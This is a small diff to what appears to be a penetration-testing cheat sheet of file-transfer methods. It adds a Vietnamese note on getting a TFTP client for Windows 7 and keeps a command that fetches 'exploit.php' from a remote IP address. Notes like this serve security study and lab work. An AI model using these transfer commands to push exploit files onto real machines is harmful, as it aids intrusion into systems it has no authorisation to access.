@@ -37,7 +37,10 @@ ftp -s:ftp.txt
 >TFTP (XP & 2003)
 
 server: atftpd --daemon --port 69 /var/www/html
-client: tftp -i 192.169.27.160 get exploit.php
+
+Trên máy Windows 7 download phần mềm tftp về ở link sau: https://www.tftp-server.com/tftp-download.html
+
+client: tftp.exe -i 192.169.27.160 get exploit.php
 
 >Powershell
 
